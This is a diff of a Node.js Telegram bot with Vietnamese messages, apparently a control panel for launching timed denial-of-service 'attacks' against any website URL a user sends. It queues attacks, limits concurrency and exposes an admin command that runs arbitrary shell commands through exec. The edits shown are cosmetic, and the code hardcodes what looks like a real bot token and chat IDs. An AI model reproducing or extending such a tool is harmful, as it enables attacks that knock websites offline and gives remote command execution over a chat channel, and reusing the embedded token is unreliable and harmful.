@@ -1,11 +1,11 @@
-const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU', adminId = 1243471275, allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 3, maxTimeAttacks = 120;
+const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), token = '7935173392:AAFYFVwBtjee7R33I64gcB3CE_-veYkU4lU', adminId = 1243471275, allowedGroupIds = new Set([-1002423723717, 987654321, 112233445, 556677889, 998877665]), bot = new TelegramBot(token, { polling: true }), maxSlot = 1, maxCurrent = 1, maxTimeAttacks = 120;
 let currentProcesses = 0, queue = [], userProcesses = {}, activeAttacks = {};
 
 bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
 
 const helpMessage = `📜 Hướng dẫn sử dụng:
 1. Tấn công: <code>https://example.com 60</code>
-2. Lệnh hệ thống (Admin): <code>exe [lệnh]</code>
+2. Lệnh hệ thống (Admin): <code>Terminal.exe [lệnh]</code>
 3. Trợ giúp: <code>/help</code>
 ⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;
 
@@ -28,7 +28,7 @@ bot.on('message', async (msg) => {
             const userAttack = Object.values(activeAttacks).find(a => a.userId === userId);
             if (userAttack) {
                 const remaining = Math.ceil((userAttack.endTime - Date.now()) / 1000);
-                return bot.sendMessage(chatId, `📥 Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
+                return bot.sendMessage(chatId, `❌ Bạn đang có một tiến trình đang chạy, vui lòng đợi ${remaining} giây còn lại!`);
             }
         }
 
@@ -43,7 +43,7 @@ bot.on('message', async (msg) => {
         currentProcesses++;
 
         const startMessage = {
-            "✨🚀🛸Sᴜᴄᴄᴇssғᴜʟʟʏ🛸🚀✨": "✨🚀🛸Sᴜᴄᴄᴇssғᴜʟʟʏ🛸🚀✨",
+            Status: "✨🚀🛸 Successfully 🛸🚀✨",
             Caller: caller,
             "PID Attack": pid,
             Website: host,
@@ -69,7 +69,7 @@ bot.on('message', async (msg) => {
 
             if (queue.length > 0) {
                 const next = queue.shift();
-                bot.sendMessage(next.chatId, `🚀 Bắt đầu tiến trình từ hàng đợi: ${next.host} ${next.time} Giây`, { parse_mode: 'HTML' });
+                bot.sendMessage(next.chatId, `🚀 Bắt đầu tiến trình từ hàng đợi 📥: ${next.host} ${next.time} Giây`, { parse_mode: 'HTML' });
                 bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
             }
         });
